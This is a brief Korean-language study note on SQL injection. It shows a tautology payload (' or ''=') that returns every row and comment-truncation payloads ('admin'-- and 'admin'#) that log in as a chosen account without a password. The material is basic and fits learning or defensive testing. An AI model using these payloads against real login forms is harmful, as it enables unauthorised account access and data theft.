# SQL Injection



## 쿼리 조작

---

### (전체 데이터 조회)
select * from table 
where id= '**' or ''='**' and pw='**' or ''='**'

### (특정 사용자 계정으로 로그인)
select * from table 
where id= 'admin'  — and pw='[아무 값]**'**'

select * from table 
where id= 'admin'#' and pw='[아무 값]**'**'

- 주석처리(—는 언어별 상이 할 수 있음)